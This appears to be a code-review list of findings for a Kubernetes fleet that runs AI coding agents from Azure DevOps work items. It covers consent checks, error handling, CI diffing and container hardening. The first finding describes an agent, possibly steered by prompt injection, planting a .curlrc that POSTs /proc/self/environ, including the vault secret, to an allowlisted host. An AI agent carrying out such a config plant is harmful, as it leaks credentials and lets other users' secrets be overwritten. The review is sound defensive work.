findings.message: The write-back container mounts the same `home` emptyDir that the agent wrote to, and runs with HOME=/home/agent. `writeback.sh` then calls `curl` and `jq` without disabling their per-user config. `curl` reads `~/.curlrc` and `jq` reads `~/.jq`. Agent code, including code steered by prompt injection, can therefore plant a `.curlrc` that changes the requests made while AZURE_CLIENT_SECRET is in the environment. This breaks the README's claim that the vault writer credential is out of the agent's reach. The README also says this service principal may set every `codex-auth-*` secret, which in Key Vault RBAC means vault scope, so it can overwrite other users' credentials. Fix: mount only `.codex/auth.json`, read-only, into write-back, and set HOME to a fresh emptyDir there. Also call `curl -q` (it must be the first argument) and `jq` with `-L /dev/null`, or set HOME to an empty directory for each call.
findings.scenario: The agent writes /home/agent/.curlrc containing `url = "https://dev.azure.com/<org>/<proj>/_apis/wit/workitems/42/comments?api-version=7.1-preview.4"`, a PAT auth header and `data = "@/proc/self/environ"`. When write-back runs `curl ... oauth2/v2.0/token`, curl also POSTs its environment, including AZURE_CLIENT_SECRET, to an allowlisted host. The vault writer secret is now disclosed.

findings.message: Consent is accepted from any `fleet:auto` tag on the work item, but the README says the tag is 'set by the assignee' and that assignment 'must not spend their plan without their say'. The code never checks who added the tag. Fix: read the work item updates or revisions and accept the tag only when the revision that added it has System.ChangedBy equal to the assignee. Add a test where someone else added the tag.
findings.scenario: User B assigns work item 42 to Alice and adds the tag `fleet:auto`. User B then approves the proposal. consented() returns 0 and the Job runs on Alice's subscription without her consent.

findings.message: Tags are compared to `fleet:auto` case-sensitively. Azure DevOps tags are case-insensitive, and a new tag takes the casing of an existing tag in the project. Compare with `lower`, and add `Fleet:Auto` and `FLEET:AUTO` rows to the AC4d table.
findings.scenario: The project already has the tag `Fleet:Auto`. The assignee adds fleet:auto, and Boards stores `Fleet:Auto`. Dispatch refuses with 'has not consented' and marks the work item Failed.

findings.message: `cfg_val` swallows every python3 failure with `2>/dev/null || true` and returns the default. So 'could not read config.yaml' (python3 missing, file missing, parse error) reads the same as 'key not set'. The README's pipeline prerequisites do not list python3. Fail when the config read itself fails, and use the default only when the key is truly absent.
findings.scenario: The pipeline agent has no python3 and config.yaml sets `fleet.image: registry.example.com/specclaw-fleet:1` and `fleet.namespace: team-fleet`. The pipeline passes `--vault`, so nothing dies. The Job is rendered with `image: specclaw-fleet:latest` in namespace `specclaw-fleet`, and the dispatch succeeds.

findings.message: `delete_job_if_uid` ends in `|| true`. A delete that fails for any reason (Forbidden, connection refused, timeout) is hidden, and the later AlreadyExists is reported as 'assignee already has an unfinished codex job'. The work item is then marked Failed with that false reason. Only a precondition (UID) conflict should map to 'busy'. Any other delete error should die with the real error. Add a test row for each.
findings.scenario: A finished `fleet-codex-<h>` exists and `kubectl delete --raw` fails with 'Unable to connect to the server'. create_job gets AlreadyExists, and the work item is set to Failed / 'refused: assignee already has an unfinished codex job' while no job is running.

findings.message: Only `HEAD^1..HEAD` is compared, with `fetchDepth: 2`. One CI run can cover a push of several commits (a direct push, or a rebase/fast-forward merge). An approval in any commit other than the last one is never seen. Diff against the commit of the last successful run, or against the push's before-SHA, with enough fetch depth.
findings.scenario: A push to main contains commit A, which approves 049, then commit B, which edits 050's state.json. The run diffs B^1..B, sees only 050, and never dispatches 049.

findings.message: The Job clones `--branch $FLEET_REF` (default `main`) at pod start, not the commit whose approval triggered the dispatch. The commit actually built is never recorded on the work item. Pass Build.SourceVersion through dispatch, check out that exact SHA, and record it in the run fields.
findings.scenario: Commit X approves 049 and triggers dispatch. Before the pod starts, commit Y on main sets 049's proposal back to draft or rewrites its tasks. The pod clones main at Y and builds and opens a PR from a proposal that is not approved.

findings.message: The agent container sets `readOnlyRootFilesystem: true`, but there is no writable /tmp and no TMPDIR. claude and codex write temporary files to os.tmpdir(), for example Claude Code's Bash-tool cwd files under /tmp, and so do git and python tempfile. The hardening covered the root filesystem but not every writable path the agents need. Mount an emptyDir at /tmp, or set TMPDIR to a path under /fleet/work.
findings.scenario: A claude run reaches its first Bash tool call. Writing /tmp/claude-<id>-cwd fails with EROFS, so every build or verify command errors, and the run ends Failed on every dispatch.

findings.message: After a failed clone, the fallback tracker directory has a status.md but no config.yaml. `specclaw-azdo-issue fields` therefore finds no `azdo.fleet_states` mapping and posts only a comment, and System.State stays at Dispatched. The README says a clone failure 'still marks the work item Failed'. Copy or pass the state and field mapping into the pod, for example as env or a ConfigMap, and write it into the fallback config.yaml. Add a test that checks a state PATCH is made on clone failure.
findings.scenario: config.yaml maps `fleet_states.failed: Failed` and the clone fails (bad ref). Boards shows the item in 'Dispatched' with only a comment, so the failure reads as a run still in progress.

findings.message: The README says to run `kubectl -n specclaw-fleet logs deploy/fleet-egress`, but the proxy is deployed in `specclaw-fleet-egress`. The host list also omits `.chatgpt.com` and `.dev.azure.com`, which squid.conf allows.
`ubuntu/squid:latest` is unpinned. The claude binary in the Dockerfile is downloaded with no checksum check. Pin the image by digest and verify the binary's sha256.

`attempt` counts the Jobs that still exist with the change label. Codex replacement deletes the old Job and ttlSecondsAfterFinished removes finished ones, so the recorded attempt resets or undercounts. A failing `get jobs` also aborts dispatch under `set -e` after the Job was already created, so Dispatched is never recorded.
